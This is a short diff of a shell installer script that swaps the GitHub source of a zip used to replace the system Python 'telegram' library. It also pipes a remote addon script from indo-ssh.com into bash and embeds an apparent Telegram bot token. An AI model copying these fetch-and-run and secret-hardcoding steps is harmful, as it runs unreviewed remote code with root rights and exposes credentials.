@@ -13,7 +13,7 @@ clear
 cd /usr/local/lib/python3.7/dist-packages
 rm -r telegram
 mkdir /usr/local/lib/python3.7/dist-packages/telegram
-cd /usr/local/lib/python3.7/dist-packages/telegram && wget https://github.com/Rerechan02/xray/raw/main/telegram.zip && unzip telegram.zip
+cd /usr/local/lib/python3.7/dist-packages/telegram && wget https://github.com/FanoraSsh/xray/raw/main/telegram.zip && unzip telegram.zip
 cd
 apt install zip unzip -y && apt install python3-pip -y && pip3 install telegram-send && curl -L "https://indo-ssh.com/addon.sh" | bash && printf "5392804490:AAGjiVyB3ZmqR3JMwJaOelZv6LMKYGLBAcU
 " | telegram-send --configure
